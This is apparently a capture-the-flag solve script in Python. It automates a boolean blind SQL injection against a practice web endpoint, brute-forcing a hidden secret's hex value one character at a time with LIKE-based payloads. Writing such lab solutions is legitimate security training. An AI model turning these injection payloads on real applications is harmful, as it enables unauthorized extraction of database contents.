#!/usr/bin/env python3
"""
Obtaining flag was harder in this challenge because of me just getting either Success or Failure as a response from the database.
To get the desired string I had to firstly reduce the scope to just 10 letters, and 5 characters aka hex.
Then my approach was to go through this dictionary and check if the current character returns Success, if it does then I add this char to my result string.
"""
import requests
import binascii
import time

class Injection:
    def __init__(self, host):
        self.session = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        response = self.session.get(self.base_url + 'get_token')
        response = response.json()
        self.token = response['token']

    def _do_raw_request(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.session.post(url, json = data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_request(url, query)
        return response['result'], response['sql_error']

inj = Injection("http://web-17.challs.olicyber.it/")
result = ""
dict = "0123456789abcdef"

while True:
    for char in dict:
        payload = f"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{result + char}%')='1"
        print(payload)
        response, error = inj.blind(payload)
        if response == "Success":
            print(response)
            result += char
            break
    else:
        break
        
print(bytes.fromhex(result))
